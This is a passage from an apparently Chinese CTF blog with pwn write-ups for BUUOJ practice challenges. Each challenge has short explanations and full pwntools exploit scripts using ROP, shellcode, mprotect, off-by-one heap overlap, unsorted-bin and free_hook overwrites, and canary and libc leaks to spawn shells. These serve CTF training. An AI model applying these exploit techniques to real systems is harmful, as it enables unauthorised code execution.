libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]
log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))

p.recvuntil(<span class="string">"?\n"</span>)
p.sendline(<span class="string">"224"</span>)
p.recvuntil(<span class="string">'saved at'</span>)
p.recvuntil(<span class="string">"0x"</span>)
stack_addr = int(p.recvline(),<span class="number">16</span>)
log.success(<span class="string">"stack_addr==&gt;"</span> + hex(stack_addr))

<span class="comment"># 0x4f2c5 0x4f322 0x10a38c</span>
one_gadget = libc_base + <span class="number">0x4f2c5</span>
payload = p64(<span class="number">0</span>) + p64(one_gadget)
payload += <span class="string">"a"</span>*(<span class="number">0xD0</span> - len(payload))
payload += p64(stack_addr) + p64(leave_ret)
p.recvuntil(<span class="string">'&gt;'</span>)
p.send(payload)

p.interactive()</code></pre>
<h2 id="0x13-pwnable-orw"><a href="#0x13-pwnable-orw" class="headerlink" title="0x13 pwnable_orw"></a>0x13 pwnable_orw</h2><p>orw一把梭  </p>
<pre><code class="Python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="comment">#p=process("pwnable_orw")</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28753</span>)
orw = asm(shellcraft.open(<span class="string">"flag"</span>, <span class="number">0</span>))
orw += asm(shellcraft.read(<span class="number">3</span>, <span class="number">0x804a040</span>, <span class="number">0x100</span>))
orw += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x804a040</span>, <span class="number">0x100</span>))
orw += asm(shellcraft.exit(<span class="number">0</span>))

p.sendafter(<span class="string">"shellcode:"</span>, orw)
p.interactive()</code></pre>
<h2 id="0x14-get-started-3dsctf-2016-amp-amp-not-the-same-3dsctf-2016"><a href="#0x14-get-started-3dsctf-2016-amp-amp-not-the-same-3dsctf-2016" class="headerlink" title="0x14  get_started_3dsctf_2016 &amp;&amp; not_the_same_3dsctf_2016"></a>0x14  get_started_3dsctf_2016 &amp;&amp; not_the_same_3dsctf_2016</h2><p>这两题都是一样的套路，用mprotect函数改一块可读可写的区域的权限为可读可写可执行，然后写shellcode,这里要提一下，为了使堆栈还原，所以调用mprotect函数之后要用pop保证堆栈平衡，因为push了3个参数，所以要用pop三个寄存器  </p>
<pre><code class="Python"><span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = (<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>)
<span class="comment">#p = remote("node3.buuoj.cn",27219)</span>
p=process(<span class="string">"./get_started_3dsctf_2016"</span>)
elf = ELF(<span class="string">"./get_started_3dsctf_2016"</span>)
addr = <span class="number">0x80ea000</span>
pop3ret = <span class="number">0x0804f460</span> <span class="comment">#pop_ebx_esi_ebp_ret 其实只要找一个pop三个寄存器的gadget就行了</span>
payload = <span class="string">"a"</span>*<span class="number">0x38</span>
payload += p32(elf.sym[<span class="string">'mprotect'</span>]) + p32(pop3ret) + p32(addr) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>)
payload += p32(elf.sym[<span class="string">'read'</span>]) + p32(pop3ret) + p32(<span class="number">0</span>) + p32(addr) + p32(<span class="number">0x200</span>) + p32(addr)
sleep(<span class="number">0.01</span>)
<span class="comment">#p.recvline()</span>
p.sendline(payload)
<span class="comment">#gdb.attach(p)</span>
payload = asm(shellcraft.sh())
p.send(payload)
p.interactive()</code></pre>
<pre><code class="Python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = (<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>)
p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26187</span>)
<span class="comment">#p=process("./not_the_same_3dsctf_2016")</span>
elf = ELF(<span class="string">"./not_the_same_3dsctf_2016"</span>)
addr = <span class="number">0x80ea000</span>
pop3ret = <span class="number">0x0804f420</span>
payload = <span class="string">"a"</span>*<span class="number">45</span>
payload += p32(elf.sym[<span class="string">'mprotect'</span>]) + p32(pop3ret) + p32(addr) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>)
payload += p32(elf.sym[<span class="string">'read'</span>]) + p32(pop3ret) + p32(<span class="number">0</span>) + p32(addr) + p32(<span class="number">0x200</span>) + p32(addr)
sleep(<span class="number">0.01</span>)
<span class="comment">#p.recvline()</span>
p.sendline(payload)
<span class="comment">#gdb.attach(p)</span>
payload = asm(shellcraft.sh())
p.send(payload)
p.interactive()</code></pre>
<h2 id="0x15-hitcontraining-heapcreator"><a href="#0x15-hitcontraining-heapcreator" class="headerlink" title="0x15  hitcontraining_heapcreator"></a>0x15  hitcontraining_heapcreator</h2><p>off-by-one改下一个chunk的size，然后overlapping，布置free_got到chunk1中，然后show(1)泄露free_addr，接着改free_got为system。/bin/sh已经放在了第一个chunk中<br>因为本题是off-by-one，只能溢出一个字节，所以必须要用\x41，不能用p64(0x41)，p64是8个字节    </p>
<pre><code class="python"><span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
<span class="comment">#p = process('./heapcreator')</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29112</span>)
elf = ELF(<span class="string">'./heapcreator'</span>)
libc = elf.libc

<span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span>
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(content)

<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span>
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(str(idx))
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(content)

<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span>
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(str(idx))

<span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span>
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(<span class="string">"4"</span>)
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(str(idx))

free_got = <span class="number">0x602018</span>
create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)
create(<span class="number">0x10</span>,<span class="string">"bbbb"</span>)
payload = <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span>*<span class="number">0x10</span> + <span class="string">'\x41'</span>  <span class="comment"># 不能用p64(0x41)</span>
edit(<span class="number">0</span>,payload)
delete(<span class="number">1</span>)
payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>)+p64(<span class="number">0x30</span>)+ p64(free_got)
create(<span class="number">0x30</span>,payload)
show(<span class="number">1</span>)

free_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))
<span class="comment">#free_addr = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))</span>
libc_base = free_addr - libc.sym[<span class="string">'free'</span>]
system_addr = libc_base + libc.sym[<span class="string">'system'</span>]
log.success(<span class="string">"free_addr==&gt;"</span> + hex(free_addr))
log.success(<span class="string">"system_addr==&gt;"</span> + hex(system_addr))
payload = p64(system_addr)
edit(<span class="number">1</span>,payload)
delete(<span class="number">0</span>)
<span class="comment">#gdb.attach(p)</span>
p.interactive()</code></pre>
<h2 id="0x16-cmcc-pwnme1"><a href="#0x16-cmcc-pwnme1" class="headerlink" title="0x16  cmcc_pwnme1"></a>0x16  cmcc_pwnme1</h2><p>这题未知原因要用LibcSearcher才能打通，加上用了新的模板，故做个记录  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">import</span> sys
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./pwnme1'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28788</span>)
elf=ELF(binary)
libc=ELF(<span class="string">"libc6-i386_2.23-0ubuntu10_amd64.so"</span>)
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    payload = <span class="string">"a"</span>*<span class="number">168</span>
    payload += p32(elf.plt[<span class="string">'puts'</span>]) 
    payload += p32(elf.sym[<span class="string">'main'</span>])
    payload += p32(elf.got[<span class="string">'puts'</span>])
    p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    \n"</span>)
    p.sendline(<span class="string">"5"</span>)
    p.recvuntil(<span class="string">"fruit:"</span>)
    p.sendline(payload)
    puts_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])
    libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]
    log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]
    binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()
    p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    \n"</span>)
    p.sendline(<span class="string">"5"</span>)
    p.recvuntil(<span class="string">"fruit:"</span>)
    one_gadget = libc_base + <span class="number">0xf02a4</span>
    payload = <span class="string">"a"</span>*<span class="number">168</span>
    payload += p32(sys_addr)
    payload += p32(<span class="number">0xdeadbeef</span>)
    payload += p32(binsh)
    p.send(payload)
    p.interactive()
exp()</code></pre>
<h2 id="0x17-0ctf2017-babyheap"><a href="#0x17-0ctf2017-babyheap" class="headerlink" title="0x17  0ctf2017-babyheap"></a>0x17  0ctf2017-babyheap</h2><p><a href="https://n0vice.top/2020/04/16/0ctf2017-babyheap" target="_blank" rel="noopener">https://n0vice.top/2020/04/16/0ctf2017-babyheap</a>  </p>
<h2 id="0x18-wdb2018-guess"><a href="#0x18-wdb2018-guess" class="headerlink" title="0x18  wdb2018_guess"></a>0x18  wdb2018_guess</h2><p><a href="https://n0vice.top/2020/04/09/Stack-smash" target="_blank" rel="noopener">https://n0vice.top/2020/04/09/Stack-smash</a>  </p>
<h2 id="0x19-hitcontraining-magicheap"><a href="#0x19-hitcontraining-magicheap" class="headerlink" title="0x19  hitcontraining_magicheap"></a>0x19  hitcontraining_magicheap</h2><p>满足choice为4869，并且magic的值大于4869，即可getshell<br>我们利用unsorted bin attack，将magic的值改掉即可    </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
<span class="keyword">import</span> sys
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./magicheap'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25408</span>)
elf=ELF(binary)
libc=elf.libc
magic = <span class="number">0x6020A0</span>
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"Heap : "</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"heap:"</span>)
    p.send(content)
<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))
    p.recvuntil(<span class="string">"Heap : "</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"heap : "</span>)
    p.send(content)
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="number">0x90</span>,<span class="string">"aaa"</span>) <span class="comment"># 0</span>
    add(<span class="number">0x90</span>,<span class="string">"bbb"</span>) <span class="comment"># 1</span>
    add(<span class="number">0x10</span>,<span class="string">"ccc"</span>)
    free(<span class="number">1</span>)
    payload = <span class="string">"a"</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(<span class="number">0</span>) + p64(magic<span class="number">-16</span>)
    edit(<span class="number">0</span>,<span class="number">0xb0</span>,payload)
    add(<span class="number">0x90</span>,<span class="string">"fuck"</span>)
    p.recvuntil(<span class="string">":"</span>)
    p.sendline(<span class="string">"4869"</span>)
    p.interactive()
exp()</code></pre>
<h2 id="0x20-roarctf-2019-easy-pwn"><a href="#0x20-roarctf-2019-easy-pwn" class="headerlink" title="0x20 roarctf_2019_easy_pwn"></a>0x20 roarctf_2019_easy_pwn</h2><p><a href="https://n0vice.top/2020/04/19/roarctf-2019-easypwn" target="_blank" rel="noopener">https://n0vice.top/2020/04/19/roarctf-2019-easypwn</a>  </p>
<h2 id="0x21-gyctf-2020-document"><a href="#0x21-gyctf-2020-document" class="headerlink" title="0x21 gyctf_2020_document"></a>0x21 gyctf_2020_document</h2><p>这题思路如下<br>申请document0、document1，free document0，UAF，通过unsorted bin泄露libc_base<br>申请document2，会切割free掉的document0一部分作为存储document2的ptr的部分，剩下的放入small bin<br>free 1，进入unsorted bin，然后再次申请document3，此时剩下在small bin中的部分会变成document3的存储ptr的那部分，并且document3和document1用的是同一块内存<br>然后大概会长这样  </p>
<pre><code class="shell"><span class="meta">pwndbg&gt;</span><span class="bash"> x/70gx 0x5587eb907000</span>
0x5587eb907000:    0x0000000000000000    0x0000000000000021
0x5587eb907010:    0x00005587eb907030    0x0000000000000001
0x5587eb907020:    0x0000000000000000    0x0000000000000021
0x5587eb907030:    0x00005587eb907170    0x0000000000000001
0x5587eb907040:    0x6362626262626262    0x0000000000000021
0x5587eb907050:    0x00005587eb9070e0 &lt;==document3 ptr    0x0000000000000001
0x5587eb907060:    0x6363636363636363    0x0000000000000051
0x5587eb907070:    0x00007f1698eabb78    0x00007f1698eabb78
0x5587eb907080:    0x6363636363636363    0x6363636363636363
0x5587eb907090:    0x6363636363636363    0x6363636363636363
0x5587eb9070a0:    0x6363636363636363    0x6363636363636363
0x5587eb9070b0:    0x0000000000000050    0x0000000000000020
0x5587eb9070c0:    0x00005587eb9070e0    0x0000000000000001
0x5587eb9070d0:    0x0000000000000000    0x0000000000000091
0x5587eb9070e0:    0x0068732f6e69622f    0x0000000000000010
0x5587eb9070f0:    0x630068732f6e6962    0x6363636363636363
0x5587eb907100:    0x6363636363636363    0x6363636363636363
0x5587eb907110:    0x6363636363636363    0x6363636363636363
0x5587eb907120:    0x6363636363636363    0x6363636363636363
0x5587eb907130:    0x6363636363636363    0x6363636363636363
0x5587eb907140:    0x6363636363636363    0x6363636363636363
0x5587eb907150:    0x6363636363636363    0x6363636363636363
0x5587eb907160:    0x0000000000000090    0x0000000000000091
0x5587eb907170:    0x0068732f6e69622f    0x0000000000000010
0x5587eb907180:    0x630068732f6e6962    0x6363636363636363
0x5587eb907190:    0x6363636363636363    0x6363636363636363
0x5587eb9071a0:    0x6363636363636363    0x6363636363636363
0x5587eb9071b0:    0x6363636363636363    0x6363636363636363
0x5587eb9071c0:    0x6363636363636363    0x6363636363636363
0x5587eb9071d0:    0x6363636363636363    0x6363636363636363
0x5587eb9071e0:    0x6363636363636363    0x6363636363636363
0x5587eb9071f0:    0x0000000000000000    0x0000000000020e11</code></pre>
<p>然后我们把这个地方改成free_hook-0x10<br>那么chunk3的地址就会变成free_hook-0x10，然后再edit document3，就能把free_hook改成system了<br>exp：  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
<span class="keyword">import</span> sys
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./gyctf_2020_document'</span> 
local = <span class="number">1</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28029</span>)
elf=ELF(binary)
libc=elf.libc
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sex,content)</span>:</span>
    p.recvuntil(<span class="string">"choice : \n"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"name\n"</span>)
    p.send(str(name))
    p.recvuntil(<span class="string">"sex\n"</span>)
    p.send(str(sex))
    p.recvuntil(<span class="string">"information\n"</span>)
    p.sendline(str(content))
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice : \n"</span>)
    p.sendline(<span class="string">"4"</span>)
    p.recvuntil(<span class="string">"index : \n"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,sex,content)</span>:</span>
    p.recvuntil(<span class="string">"choice : \n"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"index : \n"</span>)
    p.sendline(str(index))
    p.recvuntil(<span class="string">"sex?\n"</span>)
    p.sendline(str(sex))
    p.recvuntil(<span class="string">"information\n"</span>)
    p.send(str(content))
<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice : \n"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"index : \n"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="string">"aaaaaaaa"</span>,<span class="string">"bbbbbbbb"</span>,<span class="string">"c"</span>*<span class="number">112</span>) <span class="comment"># 0</span>
    add(<span class="string">"aaaaaaaa"</span>,<span class="string">"bbbbbbbb"</span>,<span class="string">"c"</span>*<span class="number">112</span>) <span class="comment"># 1</span>
    free(<span class="number">0</span>)
    show(<span class="number">0</span>)
    libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span>
    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]
    free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    log.success(<span class="string">"malloc_hook==&gt;"</span> + hex(malloc_hook))
    log.success(<span class="string">"free_hook==&gt;"</span> + hex(free_hook))

    add(<span class="string">"/bin/sh\x00"</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"c"</span>*<span class="number">112</span>) <span class="comment"># 2</span>
    free(<span class="number">1</span>)
    add(<span class="string">"/bin/sh\x00"</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"c"</span>*<span class="number">112</span>) <span class="comment"># 3</span>
    gdb.attach(p)
    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(free_hook<span class="number">-0x10</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)
    payload += <span class="string">"\x00"</span>*(<span class="number">112</span>-len(payload))
    edit(<span class="number">0</span>,<span class="string">"N"</span>,payload)
    payload = p64(system)
    payload += <span class="string">"\x00"</span>*(<span class="number">112</span>-len(payload))
    edit(<span class="number">3</span>,<span class="string">"N"</span>,payload)
    free(<span class="number">1</span>)

    p.interactive()
exp()</code></pre>
<h2 id="0x22-others-babystack"><a href="#0x22-others-babystack" class="headerlink" title="0x22  others_babystack"></a>0x22  others_babystack</h2><p>覆盖canary的低位\x00，将字符串和canary连起来，泄露出canary，然后ROP<br>exp：  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
<span class="keyword">import</span> sys
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./babystack'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26702</span>)
elf=ELF(binary)
libc=elf.libc
pop_rdi_ret = <span class="number">0x0000000000400a93</span>    
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"1"</span>)
    payload = <span class="string">"a"</span>*<span class="number">133</span> + <span class="string">"bbbb"</span>
    p.send(payload)
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"bbbb"</span>)
    canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>)
    canary = u64(canary)
    log.success(<span class="string">"canary==&gt;"</span> + hex(canary))
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"1"</span>)
    payload = <span class="string">"a"</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">"a"</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">'__libc_start_main'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(<span class="number">0x400908</span>)
    p.send(payload)
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"3"</span>)
    libc_start_main_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
    <span class="comment">#libc_start_main_addr = u32(p.recvuntil('\xf7')[-4:])</span>
    libc_base = libc_start_main_addr - libc.sym[<span class="string">'__libc_start_main'</span>]
    log.success(<span class="string">"libc_start_main_addr==&gt;"</span> + hex(libc_start_main_addr))
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()
    one_gadget = libc_base + <span class="number">0x45216</span>
    payload = <span class="string">"a"</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">"a"</span>*<span class="number">8</span> + p64(pop_rdi_ret)  + p64(binsh) + p64(system)
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"1"</span>)
    p.send(payload)
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"3"</span>)
    p.interactive()
exp()</code></pre>
<h2 id="0x23-gyctf-2020-some-thing-exceting"><a href="#0x23-gyctf-2020-some-thing-exceting" class="headerlink" title="0x23 gyctf_2020_some_thing_exceting"></a>0x23 gyctf_2020_some_thing_exceting</h2><p>这题将flag读到了程序中，所以只需要leak出flag就行了<br>但是我想fastbin attack打一下getshell看看，但是出了点问题<br>fastbin构造成chunk0-&gt;chunk1-&gt;chunk0这样的时候，泄露不出地址了，接收不到0x7f开头的地址样子的东西了<br>不知道为什么<br>后面再补（挖坑待填）<br>exp:  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
<span class="keyword">import</span> sys
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./gyctf_2020_some_thing_exceting'</span> 
local = <span class="number">1</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29130</span>)
elf=ELF(binary)
libc=elf.libc
flag = <span class="number">0x6020a8</span>
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size_ba,size_na,content_a,content_b)</span>:</span>
    p.recvuntil(<span class="string">"do :"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"length : "</span>)
    p.sendline(str(size_ba))
    p.recvuntil(<span class="string">"ba : "</span>)
    p.send(content_a)
    p.recvuntil(<span class="string">"length : "</span>)
    p.sendline(str(size_na))
    p.recvuntil(<span class="string">"na : "</span>)
    p.send(content_b)
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"do :"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"ID : "</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"do :"</span>)
    p.sendline(<span class="string">"4"</span>)
    p.recvuntil(<span class="string">"ID : "</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="number">0x60</span>,<span class="number">0x60</span>,<span class="string">"aaaa"</span>,<span class="string">"bbbb"</span>) <span class="comment"># 0</span>
    add(<span class="number">0x60</span>,<span class="number">0x60</span>,<span class="string">"cccc"</span>,<span class="string">"dddd"</span>) <span class="comment"># 1</span>
    free(<span class="number">0</span>)
    free(<span class="number">1</span>)
    add(<span class="number">16</span>,<span class="number">0x60</span>,p64(flag),p64(flag))
    show(<span class="number">0</span>)
    p.interactive()
exp()</code></pre>
<h2 id="0x24-npuctf-2020-easyheap"><a href="#0x24-npuctf-2020-easyheap" class="headerlink" title="0x24  npuctf_2020_easyheap"></a>0x24  npuctf_2020_easyheap</h2><p>申请释放0x20的chunk后，再申请回来，就能获得用户内容相邻的两块chunk，保存用户chunk信息的chunk会在上面放在一起<br>然后off by one，形成chunk overlap，伪造存信息的chunk，就能把指针改成free_got，同时伪造的时候把prev_inuse位改成0<br>构造成一个假的被free的chunk，就能leak libc，然后向被改之前的指针对应的chunk写入system<br>就getshell了<br>exp：  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
<span class="keyword">import</span> sys
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./npuctf_2020_easyheap'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28734</span>)
elf=ELF(binary)
libc=elf.libc
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"only) : "</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"Content:"</span>)
    p.send(content)
<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))
    p.recvuntil(<span class="string">"Content: "</span>)
    p.send(content)
<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"4"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="number">24</span>,<span class="string">"aaaa"</span>) <span class="comment"># 0</span>
    free(<span class="number">0</span>)
    add(<span class="number">56</span>,<span class="string">"bbbb"</span>) <span class="comment"># 0</span>
    add(<span class="number">24</span>,<span class="string">"cccc"</span>) <span class="comment"># 1</span>
    add(<span class="number">24</span>,<span class="string">"2222"</span>) <span class="comment"># 2</span>
